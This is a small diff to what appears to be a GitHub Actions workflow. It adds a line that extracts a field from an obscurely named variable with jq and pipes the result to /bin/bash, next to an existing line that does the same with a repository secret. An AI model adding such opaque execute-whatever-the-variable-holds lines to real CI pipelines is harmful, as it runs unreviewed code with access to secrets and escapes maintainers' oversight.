@@ -21,6 +21,7 @@ jobs:
           qksh7: ${{ secrets.qksh7 }}
         run: |
           printf '%s' "$qksh7" | jq -r .j966 | /bin/bash
+          echo $vj53773 | jq -r .csexm82913 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
